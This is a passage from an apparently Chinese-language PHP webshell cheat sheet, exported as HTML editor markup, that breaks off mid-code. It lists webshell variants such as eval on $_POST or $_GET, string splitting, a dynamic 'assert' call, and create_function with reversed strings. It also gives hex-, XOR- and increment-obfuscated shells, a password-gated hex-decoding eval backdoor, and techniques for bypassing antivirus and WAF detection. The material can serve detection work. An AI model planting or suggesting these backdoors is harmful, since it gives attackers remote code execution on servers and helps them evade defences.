style="margin-left: 28px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre><div class="CodeMirror-linenumber CodeMirror-gutter-elt"><div>1</div></div></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: -28px; width: 28px;"></div><div class="CodeMirror-gutter-wrapper CodeMirror-activeline-gutter" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 19px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-variable">php_flag</span> <span class="cm-variable">engine</span> <span class="cm-number">0</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="height: 23px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 27px;"></div></div></div></div></pre><h3 id='webshell-1'><span>WebShell</span></h3><h4 id='常见变形'><span>常见变形</span></h4><ul><li><p><strong><span>GLOBALS</span></strong></p><ul><li><span>eval(</span><span>$</span><span>GLOBALS</span><span>[</span><span>&#39;</span><span>_</span><span>POST</span><span>&#39;</span><span>]</span><span>[</span><span>&#39;</span><span>op</span><span>&#39;</span><span>]</span><span>);</span></li></ul></li><li><h4 id='file-1'><span>$</span><span>_</span><span>FILE</span></h4><ul><li><span>eval(</span><span>$</span><span>_</span><span>FILE</span><span>[</span><span>&#39;</span><span>name</span><span>&#39;</span><span>]</span><span>);</span></li></ul></li><li><h4 id='拆分'><span>拆分</span></h4><ul><li><span>eval(</span><span>$</span><span>{</span><span>&quot;</span><span>_</span><span>PO</span><span>&quot;</span><span>.</span><span>&quot;</span><span>ST</span><span>&quot;</span><span>} </span><span>[</span><span>&#39;</span><span>sz</span><span>&#39;</span><span>]</span><span>);</span></li></ul></li><li><h4 id='动态函数执行'><span>动态函数执行</span></h4><ul><li><span>$</span><span>k=</span><span>&quot;</span><span>ass</span><span>&quot;</span><span>.</span><span>&quot;</span><span>ert</span><span>&quot;</span><span>; </span><span>$</span><span>k(</span><span>$</span><span>{</span><span>&quot;</span><span>_</span><span>PO</span><span>&quot;</span><span>.</span><span>&quot;</span><span>ST</span><span>&quot;</span><span>} </span><span>[</span><span>&#39;</span><span>sz</span><span>&#39;</span><span>]</span><span>);</span></li><li><span>$</span><span>a=</span><span>$</span><span>_</span><span>GET</span><span>[</span><span>&#39;</span><span>a</span><span>&#39;</span><span>]</span><span>;</span><span>$</span><span>a(</span><span>$</span><span>_</span><span>GET</span><span>[</span><span>&#39;</span><span>b</span><span>&#39;</span><span>]</span><span>);</span></li></ul></li><li><h4 id='createfunction'><span>create_function</span></h4><ul><li><span>$</span><span>function = create_function(</span><span>&#39;</span><span>$</span><span>code</span><span>&#39;</span><span>,strrev(</span><span>&#39;</span><span>lave</span><span>&#39;</span><span>).</span><span>&#39;</span><span>(</span><span>&#39;</span><span>.strrev(</span><span>&#39;</span><span>TEG</span><span>_</span><span>$</span><span>&#39;</span><span>). </span><span>&#39;</span><span>[</span><span>&quot;</span><span>code</span><span>&quot;</span><span>]</span><span>);</span><span>&#39;</span><span>);</span><span>$</span><span>function();</span></li><li><span>preg_replace</span></li></ul></li><li><h4 id='变形'><span>变形</span></h4><ul><li><span>str_replace(</span>“<span> </span>“<span>, </span>“<span>e v a l</span>”<span>)</span></li></ul></li><li><h4 id='进制转化'><span>进制转化</span></h4><ul><li><span>&quot;</span><span>\</span><span>x62</span><span>\</span><span>x61</span><span>\</span><span>163</span><span>\</span><span>x65</span><span>\</span><span>x36</span><span>\</span><span>x34</span><span>\</span><span>137</span><span>\</span><span>144</span><span>\</span><span>145</span><span>\</span><span>x63</span><span>\</span><span>x6f</span><span>\</span><span>144</span><span>\</span><span>145</span><span>&quot;</span></li></ul></li><li><h4 id='进制运算'><span>进制运算</span></h4><ul><li><span>(</span><span>&quot;</span><span>#</span><span>&quot;</span><span>\^</span><span>&quot;</span><span>|</span><span>&quot;</span><span>).(</span><span>&quot;</span><span>.</span><span>&quot;</span><span>\^</span><span>&quot;</span><span>~</span><span>&quot;</span><span>).(</span><span>&quot;</span><span>/</span><span>&quot;</span><span>\^</span><span>&quot;</span><span>`</span><span>&quot;</span><span>).(</span><span>&quot;</span><span>|</span><span>&quot;</span><span>\^</span><span>&quot;</span><span>/</span><span>&quot;</span><span>).(</span><span>&quot;</span><span>{</span><span>&quot;</span><span>\^</span><span>&quot;</span><span>/</span><span>&quot;</span><span>);</span></li></ul></li><li><h4 id='自增运算'><span>自增运算</span></h4><ul><li><span>$</span><span>a=</span><span>&quot;</span><span>a</span><span>&quot;</span><span>;</span><span>$</span><span>a++;</span></li></ul></li><li><h4 id='强制类型转换'><span>强制类型转换</span></h4><ul><li><span>$</span><span>a=</span><span>&#39;</span><span>&#39;</span><span>;</span><span>$</span><span>a.=</span><span>[</span><span>]</span><span>; // Array</span></li></ul></li><li><h4 id='利用文件名'><span>利用文件名</span></h4><ul><li><span>FILE</span></li></ul></li><li><h4 id='注释-2'><span>注释</span></h4><ul><li><span>$</span><span>a=</span><span>&quot;</span><span>e</span><span>&quot;</span><span>.</span><span>&quot;</span><span>v</span><span>&quot;</span><span>./</span><span>*</span><span>-/</span><span>*</span><span>-</span><span>*</span><span>/</span><span>&quot;</span><span>a</span><span>&quot;</span><span>./</span><span>*</span><span>-</span><span>*</span><span>/</span><span>&quot;</span><span>l</span><span>&quot;</span><span>;</span></li></ul></li><li><h4 id='反射-1'><span>反射</span></h4><ul><li><span>ReflectionFunction</span></li></ul></li></ul><h4 id='bypass-5'><span>Bypass</span></h4><ul><li><h5 id='基于少见函数'><span>基于少见函数</span></h5><ul><li><span>mb_eregi_replace(</span><span>&#39;</span><span>.</span><span>*</span><span>&#39;</span><span>,</span><span>$</span><span>_</span><span>GET</span><span>[</span><span>1</span><span>]</span><span>,</span><span>&#39;</span><span>&#39;</span><span>,</span><span>&#39;</span><span>e</span><span>&#39;</span><span>);</span></li><li><span>set_error_handler + trigger_error</span></li></ul></li><li><h5 id='基于污染传播'><span>基于污染传播</span></h5><ul><li><span>putenv(</span><span>$</span><span>_</span><span>GET</span><span>[</span><span>&quot;</span><span>c</span><span>&quot;</span><span>]</span><span>);eval(getenv(</span><span>&#39;</span><span>path</span><span>&#39;</span><span>));</span></li><li><span>parse_str</span></li><li><span>parse_url</span></li><li><span>extract</span></li><li><span>token_get_all</span></li><li><span>define</span></li></ul></li><li><h5 id='基于少见源'><span>基于少见源</span></h5><ul><li><span>$</span><span>a = filter_input(INPUT_GET,</span><span>&#39;</span><span>c</span><span>&#39;</span><span>);</span></li><li><span>eval(end(getallheaders()));</span></li><li><span>get_defined_vars</span></li><li><span>getallheaders</span></li><li><span>get_meta_tags</span></li><li><span>phpinfo</span></li><li><span>外部变量 / 文件信息</span></li><li><span>重载 toString</span></li></ul></li></ul><h4 id='字符串变形函数'><span>字符串变形函数</span></h4><ul><li><span>base64_decode</span></li><li><span>base64_encode</span></li><li><span>str_replace</span></li><li><span>str_rot13</span></li><li><span>strtok</span></li><li><span>strtolower</span></li><li><span>strtoupper</span></li><li><span>strtr</span></li><li><span>substr</span></li><li><span>substr_replace</span></li><li><span>trim</span></li><li><span>ucfirst</span></li><li><span>ucwords</span></li></ul><h4 id='回调函数'><span>回调函数</span></h4><ul><li><span>array_filter</span></li><li><span>array_map</span></li><li><span>array_reduce</span></li><li><span>array_walk</span></li><li><span>array_walk</span></li><li><span>array_walk_recursive</span></li><li><span>call_user_func</span></li><li><span>call_user_func_array</span></li><li><span>filter_var</span></li><li><span>filter_var_array</span></li><li><span>preg_replace_callback</span></li><li><span>register_tick_function</span></li><li><span>registregister_shutdown_function</span></li><li><span>uasort</span></li><li><span>uksort</span></li></ul><h4 id='加解密函数'><span>加解密函数</span></h4><ul><li><span>mcrypt_encrypt</span></li><li><span>openssl_encrypt</span></li></ul><h4 id='其他执行方式'><span>其他执行方式</span></h4><ul><li><span>FFI</span></li><li><span>SimpleXML</span></li><li><span>SimpleXMLElement</span></li></ul><h4 id='自定义函数'><span>自定义函数</span></h4><p><span>使用自定义的加解密函数，在一定程度上可以绕过一些防护软件的查杀，下面的代码是一个基于十六进制的执行的简单例子。</span></p><pre class="md-fences md-end-block md-fences-with-lineno ty-contain-cm modeLoaded" spellcheck="false" lang="php"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="php"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.33333px; left: 36px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 28px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre><div class="CodeMirror-linenumber CodeMirror-gutter-elt"><div>9</div></div></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: -28px; width: 28px;"></div><div class="CodeMirror-gutter-wrapper CodeMirror-activeline-gutter" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 19px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-variable-2">$string</span><span class="cm-operator">=</span><span class="cm-string">''</span>;</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 19px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-variable-2">$password</span><span class="cm-operator">=</span><span class="cm-string">'password'</span>;</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 19px;">3</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-keyword">if</span>(<span class="cm-keyword">isset</span>(<span class="cm-variable-2">$_POST</span>[<span class="cm-variable-2">$password</span>])){</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 19px;">4</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-variable-2">$hex</span><span class="cm-operator">=</span><span class="cm-variable-2">$_POST</span>[<span class="cm-variable-2">$password</span>];</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 19px;">5</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-keyword">for</span>(<span class="cm-variable-2">$i</span><span class="cm-operator">=</span><span class="cm-number">0</span>;<span class="cm-variable-2">$i</span><span class="cm-operator">&lt;</span><span class="cm-builtin">strlen</span>(<span class="cm-variable-2">$hex</span>)<span class="cm-operator">-</span><span class="cm-number">1</span>;<span class="cm-variable-2">$i</span><span class="cm-operator">+=</span><span class="cm-number">2</span>){</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 19px;">6</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-variable-2">$string</span>.<span class="cm-operator">=</span><span class="cm-variable">chr</span>(<span class="cm-builtin">hexdec</span>(<span class="cm-variable-2">$hex</span>[<span class="cm-variable-2">$i</span>].<span class="cm-variable-2">$hex</span>[<span class="cm-variable-2">$i</span><span class="cm-operator">+</span><span class="cm-number">1</span>]));</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 19px;">7</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  }</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 19px;">8</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">}</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 19px;">9</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-keyword">eval</span>(<span class="cm-variable-2">$string</span>);</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 204px;"></div><div class="CodeMirror-gutters" style="height: 204px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 27px;"></div></div></div></div></pre><p>&nbsp;</p><h4 id='特殊字符-shell'><span>特殊字符 Shell</span></h4><p><span>PHP 的字符串可以在进行异或、自增运算的时候，会直接进行运算，故可以使用特殊字符来构成 Shell。</span></p><pre class="md-fences md-end-block md-fences-with-lineno ty-contain-cm modeLoaded" spellcheck="false" lang="shell"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="shell"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.33333px; left: 36px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 28px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre><div class="CodeMirror-linenumber CodeMirror-gutter-elt"><div>1</div></div></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: -28px; width: 28px;"></div><div class="CodeMirror-gutter-wrapper CodeMirror-activeline-gutter" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 19px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">&lt;?<span class="cm-operator">=</span><span class="cm-quote">`{</span><span class="cm-def">${~"\xa0\xb8\xba\xab"}</span><span class="cm-quote">[~"\xa0"]}`</span>;</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="height: 23px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 27px;"></div></div></div></div></pre><pre class="md-fences md-end-block md-fences-with-lineno ty-contain-cm modeLoaded" spellcheck="false" lang="shell"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="shell"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.33333px; left: 36px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 28px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre><div class="CodeMirror-linenumber CodeMirror-gutter-elt"><div>3</div></div></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: -28px; width: 28px;"></div><div class="CodeMirror-gutter-wrapper CodeMirror-activeline-gutter" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 19px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">@<span class="cm-def">$_</span><span class="cm-operator">++</span>;</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 19px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-def">$__</span><span class="cm-operator">=</span>(<span class="cm-string">"#"</span>^<span class="cm-string">"|"</span>).(<span class="cm-string">"."</span>^<span class="cm-string">"~"</span>).(<span class="cm-string">"/"</span>^<span class="cm-string">"`"</span>).(<span class="cm-string">"|"</span>^<span class="cm-string">"/"</span>).(<span class="cm-string">"{"</span>^<span class="cm-string">"/"</span>);</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 19px;">3</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">@<span class="cm-def">${$__}</span>[!<span class="cm-def">$_</span>](<span class="cm-def">${$__}</span>[<span class="cm-def">$_</span>]);</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 68px;"></div><div class="CodeMirror-gutters" style="height: 68px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 27px;"></div></div></div></div></pre><pre class="md-fences md-end-block md-fences-with-lineno ty-contain-cm modeLoaded" spellcheck="false" lang="shell" style="break-inside: unset;"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="shell"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.33333px; left: 44px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 36px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre><div class="CodeMirror-linenumber CodeMirror-gutter-elt"><div>33</div></div></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: -36px; width: 36px;"></div><div class="CodeMirror-gutter-wrapper CodeMirror-activeline-gutter" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 27px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-def">$_</span><span class="cm-operator">=</span>[];</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-def">$_</span><span class="cm-operator">=</span>@<span class="cm-string">"</span><span class="cm-def">$_</span><span class="cm-string">"</span>;//<span class="cm-def">$_</span><span class="cm-operator">=</span><span class="cm-string">'Array'</span>;</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">3</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-def">$_</span><span class="cm-operator">=</span><span class="cm-def">$_</span>[<span class="cm-string">'!'</span><span class="cm-operator">==</span><span class="cm-string">'@'</span>];//<span class="cm-def">$_</span><span class="cm-operator">=</span><span class="cm-def">$_</span>[0];</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">4</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-def">$___</span><span class="cm-operator">=</span><span class="cm-def">$_</span>;//A</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">5</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-def">$__</span><span class="cm-operator">=</span><span class="cm-def">$_</span>;</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">6</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-def">$__</span><span class="cm-operator">++</span>;<span class="cm-def">$__</span><span class="cm-operator">++</span>;<span class="cm-def">$__</span><span class="cm-operator">++</span>;<span class="cm-def">$__</span><span class="cm-operator">++</span>;<span class="cm-def">$__</span><span class="cm-operator">++</span>;<span class="cm-def">$__</span><span class="cm-operator">++</span>;<span class="cm-def">$__</span><span class="cm-operator">++</span>;<span class="cm-def">$__</span><span class="cm-operator">++</span>;<span class="cm-def">$__</span><span class="cm-operator">++</span>;<span class="cm-def">$__</span><span class="cm-operator">++</span>;<span class="cm-def">$__</span><span class="cm-operator">++</span>;<span class="cm-def">$__</span><span class="cm-operator">++</span>;<span class="cm-def">$__</span><span class="cm-operator">++</span>;<span class="cm-def">$__</span><span class="cm-operator">++</span>;<span class="cm-def">$__</span>,→<span class="cm-operator">++</span>;<span class="cm-def">$__</span><span class="cm-operator">++</span>;<span class="cm-def">$__</span><span class="cm-operator">++</span>;<span class="cm-def">$__</span><span class="cm-operator">++</span>;</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">7</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-def">$___</span>.<span class="cm-operator">=</span><span class="cm-def">$__</span>;//S</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">8</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-def">$___</span>.<span class="cm-operator">=</span><span class="cm-def">$__</span>;//S</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">9</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-def">$__</span><span class="cm-operator">=</span><span class="cm-def">$_</span>;</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 27px;">10</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-def">$__</span><span class="cm-operator">++</span>;<span class="cm-def">$__</span><span class="cm-operator">++</span>;<span class="cm-def">$__</span><span class="cm-operator">++</span>;<span class="cm-def">$__</span><span class="cm-operator">++</span>;//E</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">11</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-def">$___</span>.<span class="cm-operator">=</span><span class="cm-def">$__</span>;</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">12</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-def">$__</span><span class="cm-operator">=</span><span class="cm-def">$_</span>;</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">13</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-def">$__</span><span class="cm-operator">++</span>;<span class="cm-def">$__</span><span class="cm-operator">++</span>;<span class="cm-def">$__</span><span class="cm-operator">++</span>;<span class="cm-def">$__</span><span class="cm-operator">++</span>;<span class="cm-def">$__</span><span class="cm-operator">++</span>;<span class="cm-def">$__</span><span class="cm-operator">++</span>;<span class="cm-def">$__</span><span class="cm-operator">++</span>;<span class="cm-def">$__</span><span class="cm-operator">++</span>;<span class="cm-def">$__</span><span class="cm-operator">++</span>;<span class="cm-def">$__</span><span class="cm-operator">++</span>;<span class="cm-def">$__</span><span class="cm-operator">++</span>;<span class="cm-def">$__</span><span class="cm-operator">++</span>;<span class="cm-def">$__</span><span class="cm-operator">++</span>;<span class="cm-def">$__</span><span class="cm-operator">++</span>;<span class="cm-def">$__</span>,→<span class="cm-operator">++</span>;<span class="cm-def">$__</span><span class="cm-operator">++</span>;<span class="cm-def">$__</span><span class="cm-operator">++</span>;//R</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">14</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-def">$___</span>.<span class="cm-operator">=</span><span class="cm-def">$__</span>;</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">15</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-def">$__</span><span class="cm-operator">=</span><span class="cm-def">$_</span>;</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">16</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-def">$__</span><span class="cm-operator">++</span>;<span class="cm-def">$__</span><span class="cm-operator">++</span>;<span class="cm-def">$__</span><span class="cm-operator">++</span>;<span class="cm-def">$__</span><span class="cm-operator">++</span>;<span class="cm-def">$__</span><span class="cm-operator">++</span>;<span class="cm-def">$__</span><span class="cm-operator">++</span>;<span class="cm-def">$__</span><span class="cm-operator">++</span>;<span class="cm-def">$__</span><span class="cm-operator">++</span>;<span class="cm-def">$__</span><span class="cm-operator">++</span>;<span class="cm-def">$__</span><span class="cm-operator">++</span>;<span class="cm-def">$__</span><span class="cm-operator">++</span>;<span class="cm-def">$__</span><span class="cm-operator">++</span>;<span class="cm-def">$__</span><span class="cm-operator">++</span>;<span class="cm-def">$__</span><span class="cm-operator">++</span>;<span class="cm-def">$__</span>,→<span class="cm-operator">++</span>;<span class="cm-def">$__</span><span class="cm-operator">++</span>;<span class="cm-def">$__</span><span class="cm-operator">++</span>;<span class="cm-def">$__</span><span class="cm-operator">++</span>;<span class="cm-def">$__</span><span class="cm-operator">++</span>;//T</span></pre></div><div style="position: relative;"><div 